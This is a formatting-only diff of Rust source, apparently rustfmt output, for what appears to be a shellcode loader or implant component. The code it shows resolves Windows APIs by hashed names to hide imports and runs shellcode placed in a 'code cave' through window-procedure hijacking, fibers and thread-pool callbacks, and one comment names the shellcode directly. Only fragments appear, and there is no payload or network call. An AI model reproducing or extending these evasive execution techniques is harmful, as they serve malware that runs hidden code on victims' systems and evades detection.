@@ -94,9 +94,17 @@ const fn const_hash_wstr(units: &[u16]) -> u32 {
             break;
         }
         let lo = c as u8;
-        let lo = if lo >= b'A' && lo <= b'Z' { lo + 32 } else { lo };
+        let lo = if lo >= b'A' && lo <= b'Z' {
+            lo + 32
+        } else {
+            lo
+        };
         let hi = (c >> 8) as u8;
-        let hi = if hi >= b'A' && hi <= b'Z' { hi + 32 } else { hi };
+        let hi = if hi >= b'A' && hi <= b'Z' {
+            hi + 32
+        } else {
+            hi
+        };
         hash = hash.rotate_right(13) ^ (lo as u32);
         hash = hash.rotate_right(13) ^ (hi as u32);
         i += 1;
@@ -107,17 +115,41 @@ const fn const_hash_wstr(units: &[u16]) -> u32 {
 // ─── Pre-computed hashes ──────────────────────────────────────────────────
 
 const NTDLL_DLL_HASH: u32 = const_hash_wstr(&[
-    b'n' as u16, b't' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
-    b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
+    b'n' as u16,
+    b't' as u16,
+    b'd' as u16,
+    b'l' as u16,
+    b'l' as u16,
+    b'.' as u16,
+    b'd' as u16,
+    b'l' as u16,
+    b'l' as u16,
 ]);
 const KERNEL32_DLL_HASH: u32 = const_hash_wstr(&[
-    b'k' as u16, b'e' as u16, b'r' as u16, b'n' as u16, b'e' as u16,
-    b'l' as u16, b'3' as u16, b'2' as u16, b'.' as u16, b'd' as u16,
-    b'l' as u16, b'l' as u16,
+    b'k' as u16,
+    b'e' as u16,
+    b'r' as u16,
+    b'n' as u16,
+    b'e' as u16,
+    b'l' as u16,
+    b'3' as u16,
+    b'2' as u16,
+    b'.' as u16,
+    b'd' as u16,
+    b'l' as u16,
+    b'l' as u16,
 ]);
 const USER32_DLL_HASH: u32 = const_hash_wstr(&[
-    b'u' as u16, b's' as u16, b'e' as u16, b'r' as u16, b'3' as u16,
-    b'2' as u16, b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
+    b'u' as u16,
+    b's' as u16,
+    b'e' as u16,
+    b'r' as u16,
+    b'3' as u16,
+    b'2' as u16,
+    b'.' as u16,
+    b'd' as u16,
+    b'l' as u16,
+    b'l' as u16,
 ]);
 
 const HASH_FIND_WINDOW_A: u32 = const_hash_str(b"FindWindowA\0");
@@ -256,14 +288,15 @@ unsafe fn execute_wndproc_hijack(cave: &CodeCave) -> Result<()> {
         pe_resolve::get_proc_address_by_hash(user32, HASH_SET_WINDOW_LONG_PTR_W)
             .map(|addr| std::mem::transmute(addr));
 
-    let post_message_w: Option<
-        unsafe extern "system" fn(HWND, u32, WPARAM, LPARAM) -> BOOL,
-    > = pe_resolve::get_proc_address_by_hash(user32, HASH_POST_MESSAGE_W)
-        .map(|addr| std::mem::transmute(addr));
+    let post_message_w: Option<unsafe extern "system" fn(HWND, u32, WPARAM, LPARAM) -> BOOL> =
+        pe_resolve::get_proc_address_by_hash(user32, HASH_POST_MESSAGE_W)
+            .map(|addr| std::mem::transmute(addr));
 
     let find_window = find_window_a.ok_or_else(|| anyhow!("FindWindowA not resolved"))?;
-    let get_wndproc = get_window_long_ptr_w.ok_or_else(|| anyhow!("GetWindowLongPtrW not resolved"))?;
-    let set_wndproc = set_window_long_ptr_w.ok_or_else(|| anyhow!("SetWindowLongPtrW not resolved"))?;
+    let get_wndproc =
+        get_window_long_ptr_w.ok_or_else(|| anyhow!("GetWindowLongPtrW not resolved"))?;
+    let set_wndproc =
+        set_window_long_ptr_w.ok_or_else(|| anyhow!("SetWindowLongPtrW not resolved"))?;
     let post_message = post_message_w.ok_or_else(|| anyhow!("PostMessageW not resolved"))?;
 
     // Find any top-level window.
@@ -432,10 +465,9 @@ unsafe fn execute_fiber_hijack(cave: &CodeCave) -> Result<()> {
         pe_resolve::get_proc_address_by_hash(kernel32, HASH_CONVERT_THREAD_TO_FIBER)
             .map(|addr| std::mem::transmute(addr));
 
-    let create_fiber: Option<
-        unsafe extern "system" fn(SIZE_T, PVOID, PVOID) -> PVOID,
-    > = pe_resolve::get_proc_address_by_hash(kernel32, HASH_CREATE_FIBER)
-        .map(|addr| std::mem::transmute(addr));
+    let create_fiber: Option<unsafe extern "system" fn(SIZE_T, PVOID, PVOID) -> PVOID> =
+        pe_resolve::get_proc_address_by_hash(kernel32, HASH_CREATE_FIBER)
+            .map(|addr| std::mem::transmute(addr));
 
     let switch_to_fiber: Option<unsafe extern "system" fn(PVOID)> =
         pe_resolve::get_proc_address_by_hash(kernel32, HASH_SWITCH_TO_FIBER)
@@ -445,7 +477,8 @@ unsafe fn execute_fiber_hijack(cave: &CodeCave) -> Result<()> {
         pe_resolve::get_proc_address_by_hash(kernel32, HASH_DELETE_FIBER)
             .map(|addr| std::mem::transmute(addr));
 
-    let convert = convert_thread_to_fiber.ok_or_else(|| anyhow!("ConvertThreadToFiber not resolved"))?;
+    let convert =
+        convert_thread_to_fiber.ok_or_else(|| anyhow!("ConvertThreadToFiber not resolved"))?;
     let create = create_fiber.ok_or_else(|| anyhow!("CreateFiber not resolved"))?;
     let switch_fn = switch_to_fiber.ok_or_else(|| anyhow!("SwitchToFiber not resolved"))?;
     let delete = delete_fiber.ok_or_else(|| anyhow!("DeleteFiber not resolved"))?;
@@ -517,10 +550,10 @@ unsafe fn execute_threadpool_callback(cave: &CodeCave) -> Result<()> {
 
     // TpAllocWork: PTP_WORK* out, PTP_SIMPLE_CALLBACK callback, PVOID context, PTP_CALLBACK_ENVIRON env
     type TpAllocWorkFn = unsafe extern "system" fn(
-        *mut PVOID,   // PTP_WORK *
-        PVOID,        // PTP_SIMPLE_CALLBACK (callback)
-        PVOID,        // PVOID (context)
-        PVOID,        // PTP_CALLBACK_ENVIRON (optional, NULL)
+        *mut PVOID, // PTP_WORK *
+        PVOID,      // PTP_SIMPLE_CALLBACK (callback)
+        PVOID,      // PVOID (context)
+        PVOID,      // PTP_CALLBACK_ENVIRON (optional, NULL)
     ) -> NTSTATUS;
 
     type TpPostWorkFn = unsafe extern "system" fn(PVOID /* PTP_WORK */);
@@ -547,7 +580,7 @@ unsafe fn execute_threadpool_callback(cave: &CodeCave) -> Result<()> {
     let mut work: PVOID = std::ptr::null_mut();
     let status = alloc_fn(
         &mut work as *mut PVOID,
-        cave.address, // callback = shellcode in code cave
+        cave.address,         // callback = shellcode in code cave
         std::ptr::null_mut(), // context = NULL
         std::ptr::null_mut(), // callback environ = NULL (use default)
     );
